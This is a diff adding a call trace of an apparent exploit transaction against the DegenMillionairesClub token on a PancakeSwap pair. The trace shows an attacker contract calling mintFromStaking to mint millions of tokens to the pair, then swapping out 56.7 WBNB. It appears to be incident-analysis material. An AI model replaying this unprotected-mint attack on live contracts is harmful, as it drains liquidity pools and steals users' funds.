@@ -1,0 +1,13 @@
+[1][CREATE] from=0x8faa29, to=0xf91c97, atInversebrahint248() -> 0x608060
+  [2][CREATE] from=0xf91c97, to=0x6f221c, atInversebrahint248() -> 0x608060
+    [3][STATICCALL] from=0x6f221c, to=PancakePair, token0() -> 0xa176c5
+    [3][STATICCALL] from=0x6f221c, to=PancakePair, token1() -> 0xbb4cdb
+    [3][STATICCALL] from=0x6f221c, to=DegenMillionairesClub, balanceOf(account(address): 0x6Ce9b4) -> 1543589061712977529938481
+    [3][STATICCALL] from=0x6f221c, to=WBNB, balanceOf((address): 0x6Ce9b4) -> 59761124101533742134
+  [2][CALL] from=0xf91c97, to=0x6f221c, call() -> None
+    [3][CALL] from=0x6f221c, to=DegenMillionairesClub, mintFromStaking(to(address): 0x6Ce9b4, amount(uint256): 8232474995802546826338560) -> None
+    [3][CALL] from=0x6f221c, to=PancakePair, swap(amount0Out(uint256): 0, amount1Out(uint256): 56700000000000000000, to(address): 0x8faA29, data(bytes): b'') -> None
+      [4][CALL] from=PancakePair, to=WBNB, transfer(dst(address): 0x8faA29, wad(uint256): 56700000000000000000) -> True
+      [4][STATICCALL] from=PancakePair, to=DegenMillionairesClub, balanceOf(account(address): 0x6Ce9b4) -> 32462383574609428002755033
+      [4][STATICCALL] from=PancakePair, to=WBNB, balanceOf((address): 0x6Ce9b4) -> 3061124101533742134
+    [3][STATICCALL] from=0x6f221c, to=WBNB, balanceOf((address): 0x8faA29) -> 56700000000000000000
